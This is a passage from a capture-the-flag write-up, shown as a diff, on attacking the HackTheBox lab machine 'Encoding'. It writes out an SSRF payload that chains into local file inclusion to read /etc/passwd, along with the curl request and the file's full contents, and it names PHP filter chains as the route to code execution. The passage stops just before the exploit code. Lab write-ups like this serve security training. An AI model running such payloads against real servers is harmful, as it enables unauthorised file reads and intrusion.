@@ -403,5 +403,83 @@ echo $response;
 ?>
 ```
 
+Here's what the script does thanks chatgpt 🤓
+
+```
+It starts by checking if the request has file data, by checking if $_FILES['data_file'] is set. If it is set, it means the request contains a file and $is_file is set to true. The $action, $uri_path, and $data (file data) are then extracted from the request.
+
+If the request does not contain file data, the script expects to receive JSON data in the body of the request, which it retrieves using file_get_contents('php://input') and decodes using json_decode(). The $action, $uri_path, and $data (JSON data) are then extracted from the decoded JSON.
+
+If the decoded JSON data is empty or does not contain the required parameters 'action' and 'uri_path', a JSON response with the message 'Insufficient parameters!' is returned.
+
+Finally, the function make_api_call is called with the $action, $data, $uri_path, and $is_file as parameters, and the response is echoed as the final output.
+```
+
+After analyzing the code completely we see that it is prone to SSRF. The code checks whether data was received in the HTTP request in file format or in JSON format. In both cases, the data is decoded and used in a call to the make_api_call function. However, there is no proper validation of the data before it is used in the HTTP request.
+
+In this way we can perform the ssrf and to call the file "action_handler" of the subdomain "image.haxtables.htb" that is vulnerable to LFI.
+
+```
+{
+  "action": "",
+  "data": "",
+  "uri_path": "lol@image.haxtables.htb/actions/action_handler.php?page=/etc/passwd&"
+}
+
+```
+
+Here's request
+
+```
+└─$ cat data.json
+{
+  "action": "",
+  "data": "",
+  "uri_path": "lol@image.haxtables.htb/actions/action_handler.php?page=/etc/passwd&"
+}
+                                                                                                        
+┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Encoding]
+└─$ curl -X POST http://haxtables.htb/handler.php -H "Content-Type: application/json" -d @data.json
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+syslog:x:107:113::/home/syslog:/usr/sbin/nologin
+uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
+tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
+landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
+usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+svc:x:1000:1000:svc:/home/svc:/bin/bash
+lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
+fwupd-refresh:x:113:120:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+_laurel:x:998:998::/var/log/laurel:/bin/false
+```
+
+Now how do we get rce via this LFI from watching IPPSEC video on [Updown](https://www.youtube.com/watch?v=yW_lxWB1Yd0) i learnt LFI can be abused via a [PHP filters chain](https://github.com/synacktiv/php_filter_chain_generator)
+
+Here's the exploit
+
 
 
